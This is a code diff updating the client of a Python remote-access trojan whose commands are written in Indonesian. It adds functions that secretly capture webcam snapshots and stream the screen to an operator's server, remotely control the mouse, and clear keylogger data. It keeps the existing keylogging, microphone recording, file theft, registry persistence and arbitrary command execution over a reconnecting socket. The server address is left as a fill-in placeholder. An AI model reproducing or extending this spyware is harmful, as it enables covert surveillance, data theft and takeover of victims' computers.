@@ -11,17 +11,38 @@ import cv2
 import pickle
 import struct
 import pyautogui
-from vidstream import ScreenShareClient
 import shutil
 import pyaudio
 from pynput.keyboard import Key, Controller
+import client
+from mss import mss
+import numpy as np
 
 sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+def send_camera_image(server_ip, port=9999):
+    cap = cv2.VideoCapture(0)
+    ret, frame = cap.read()
+    cap.release()
+
+    if not ret:
+        return
+
+    _, img_encoded = cv2.imencode(".jpg", frame)
+    data = img_encoded.tobytes()
+
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((server_ip, port))
+
+    client.sendall(struct.pack("!I", len(data)))
+    client.sendall(data)
+
+    client.close()
 
 keyb = Controller()
 def acc_keystroke():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect(('192.168.18.210', 9995))
+        s.connect(('[Your server ip]', 9995))
         while True:
             data = s.recv(1024)
             if not data:
@@ -55,7 +76,7 @@ def record_n_send():
     frame = []
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect(('192.168.18.210', 9996))
+            s.connect(('[Your server ip]', 9996))
             for _ in range(0, int(RATE / CHUNK * 5)):
                 data = stream.read(CHUNK)
                 s.sendall(data)
@@ -79,19 +100,36 @@ def  execute_persistence(nama_registry, file_exe):
     except:
         pass
 
-def byte_stream_recorder():
-    send = ScreenShareClient('192.168.18.210', 9997)
-    
-    t =  threading.Thread(target=send.start_stream)
-    t.start()
 
-    while input("") != 'stop':
-          continue
-    send.stop_stream()
+def send_screen_record(server_ip, port=9991):
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((server_ip, port))
+    
+    sct = mss()
+    monitor = sct.monitors[1]
+
+    while True:
+        try:
+            img = np.array(sct.grab(monitor))
+            frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+
+            data = pickle.dumps(frame)
+            size = struct.pack("Q", len(data))
+            client.sendall(size + data)
+
+            if cv2.waitKey(1) & 0xFF == ord('q'):
+                break
+
+        except Exception as e:
+            print(f'{e}')
+            break
+
+    client.close()
+    cv2.destroyAllWindows()
 
 def byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(('192.168.18.210', 9998))
+    sock.connect(('[Your server ip]', 9998))
     vid = cv2.VideoCapture(0)
     while (vid.isOpened()):
         img, frame = vid.read()
@@ -114,11 +152,11 @@ def log_thread():
 def download_file(namafile):
     file = open(namafile, 'wb')
     sok.settimeout(1)
-    _file = sok.recv(100000)
+    _file = sok.recv(65536*100)
     while _file:
         file.write(_file)
         try:
-            _file = sok.recv(100000)
+            _file = sok.recv(65536*100)
         except socket.timeout as e:
             break
     sok.settimeout(None)
@@ -155,16 +193,18 @@ def jalankan_perintah():
             Keylogger().start_log()
         elif perintah == 'baca_log':
             log_thread()
+        elif perintah == 'clear_log':
+            Keylogger().clear_log()
         elif perintah == 'stop_log':
             Keylogger().stop_listener()
         elif perintah == 'start_cam':
             kirim_byte_stream()
-        elif perintah == 'screensh':
+        elif perintah == 'screen_shot':
             ss = pyautogui.screenshot()
             ss.save('ss.png')
             upload_file('ss.png')
-        elif perintah == 'screensr':
-            byte_stream_recorder()
+        elif perintah == 'screen_share':
+            send_screen_record(server_ip='[Your server ip]', port=9991)
         elif perintah[:11] == 'persistence':
             nama_registry, file_exe = perintah[12:].split(' ')
             execute_persistence(nama_registry, file_exe)
@@ -174,8 +214,12 @@ def jalankan_perintah():
             record_n_send()
         elif perintah == 'banner':
             pass
-        elif perintah == 'send':
+        elif perintah == 'send_key':
             acc_keystroke()
+        elif perintah == 'send_mouse':
+            client.start_client(host='[Your server ip]', port=9994)
+        elif perintah == 'snap_cam':
+            send_camera_image(server_ip='[Your server ip]', port=9993)
         else:
             exe = subprocess.Popen(
             perintah,
@@ -193,11 +237,12 @@ def execute_persist():
     while True:
         try:
             time.sleep(10)
-            sok.connect(('192.168.18.210', 9999))
+            sok.connect(('[Your server ip]', 9999))
             jalankan_perintah()
             sok.close()
             break
         except:
             execute_persist()
+
 
 execute_persist() 
